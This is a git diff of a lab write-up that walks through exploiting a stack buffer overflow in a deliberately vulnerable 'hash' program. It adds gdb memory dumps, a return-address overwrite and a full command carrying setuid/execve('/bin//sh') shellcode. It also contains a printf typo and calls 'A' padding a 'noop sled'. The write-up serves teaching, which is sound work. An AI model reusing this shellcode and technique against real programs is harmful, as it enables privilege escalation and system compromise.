@@ -81,7 +81,7 @@ After the check to see if a string is provided what immediately jumps out is the
 It only allocates 512 bytes for our input, but never checks the length. 
 If we *hypothetically* provided a string longer than 512 bytes we could possibly make the program execute arbitrary code!
 
-### Step 2: Crafting an exploit
+### Step 2: Making our own return address
 
 Luckily for us we dont have to actaully write a string that is 500+bytes long; we can get the terminal to do it for us.
 If we execute provide `$(printf "\x41%.0s" {1..540})` as our string it'll translate to 540 "A"s (hex 41) - which results in the following:
@@ -103,50 +103,85 @@ If we increase the number of 41s we provide to 542 we could overwrite the entire
 We can take a look at our stack memory by entering the following:
 ```txt
 (gdb) x /-140fx $rsp
-0x7fff35ef0a40:	0x35ef0d78	0x00007fff	0x00000000	0x00000002
-0x7fff35ef0a50:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0a60:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0a70:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0a80:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0a90:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0aa0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0ab0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0ac0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0ad0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0ae0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0af0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b00:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b10:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b20:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b30:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b40:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b50:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b60:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b70:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b80:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0b90:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0ba0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0bb0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0bc0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0bd0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0be0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0bf0:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c00:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c10:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c20:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c30:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c40:	0x41414141	0x41414141	0x41414141	0x41414141
-0x7fff35ef0c50:	0x41414141	0x41414141	0x00000000	0x00000000
-0x7fff35ef0c60:	0x41414141	0x41414141	0x41414141	0x00007f00
+0x7ffd6cb8fe90:	0x6cb901c8	0x00007ffd	0x00000000	0x00000002
+0x7ffd6cb8fea0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8feb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8fec0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8fed0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8fee0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8fef0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff00:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff10:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff20:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff30:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff40:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff50:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff60:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff70:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff80:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ff90:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ffa0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ffb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ffc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ffd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8ffe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb8fff0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90000:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90040:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90050:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90060:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90070:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90080:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb90090:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffd6cb900a0:	0x41414141	0x41414141	0x00000000	0x00000000
+0x7ffd6cb900b0:	0x41414141	0x41414141	0x41414141	0x00004141
 ```
 
 Look at all those 41s. Lets pick out an address towards the top - memory shifts around slightly, so the larger the buffer the better.
-Well use `0x7fff35ef0a60` for this example.
+Well use `0x7ffd6cb8fec0` for this example.
 
-Going back to our string we have to input our address in backwards as intel is [little endian]().
+Going back to our string we have to input our address in backwards as intel is [little endian](https://en.wikipedia.org/wiki/Endianness#Hardware).
 So the resulting code should fill the stack with 41s and then point back into it:
 ```txt
-(gdb) run $(printf "\x41%.0s" {1..536}; printf "\x60\x0a\xef\x35\xff\x7f")
+(gdb) run $(printf "\x41%.0s" {1..536}; printf "\xc0\xfe\xb8\x6c\xfd\x7f")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/spud/GitHub/CSC-BufferOverflow-Lab/hash $(printf "\x41%.0s" {1..536}; printf "\xc0\xfe\xb8\x6c\xfd\x7f") # 0x7ffd6cb8fec0
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+Hash: (null)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffd6cb8fec0 in ?? ()
+```
+Hey! That looks like our address! 
+If we examine what's at our return address which is causing it to segfault it will reveal that it's trying to run `0x41414141`
+```txt
+(gdb) x 0x7ffd6cb8fec0
+0x7ffd6cb8fec0: 0x41414141
 ```
 
-// TODO
+### Step 3: Spawning a shell
+So we control where the stack returns to... Why not have it execute code that spawns a shell rather than just a bunch of 41s?
+To speed things up there is shellcode provided with the lab. 
+But because our shellcode puts its own variables on the stack we need to give it some buffer, otherwise it will overwrite its own tail.
+
+```txt
+(gdb) run $(printf "\x41%.0s" {1..480}; printf "\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05"; printf "\x41.0s" {1..22}; printf "\xc0\xfe\xb8\x6c\xfd\x7f")
+```
+
+So our shell works - Excelent, although this was done in a debugger. The real test now is does it work outside the debugger.
+Exiting twice (once for the shell and the final for gdb) and returning to our shell we can now try running the program with our crafted input.
+
+Memory addresses may be slightly different outside the debugger, but that's why we allowed for such a large noop sled.
+We can catch more addresses with a larger net so to say.
+
+Once the program has been run and a shell has been spawned go ahead and check who you are running the shell as via
+`whoami`
+
+
+
+Thus concludes the writeup.
